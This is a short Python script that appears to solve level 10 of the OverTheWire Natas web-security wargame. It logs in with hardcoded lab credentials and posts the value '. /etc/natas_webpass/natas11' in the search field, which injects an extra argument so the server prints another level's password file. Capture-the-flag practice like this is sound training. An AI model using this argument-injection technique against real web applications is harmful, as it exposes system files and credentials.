import requests

#  not used


username = "natas10"
password = "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE"

url = f"http://{username}.natas.labs.overthewire.org/"


print(url)
print(password)

session = requests.Session()
response = session.get(url, auth = (username, password))
response = session.post(url, data = {"needle": ". /etc/natas_webpass/natas11"}, 
                auth = (username, password))
content = response.text

print(content)
print(response.headers)
print(session.cookies)


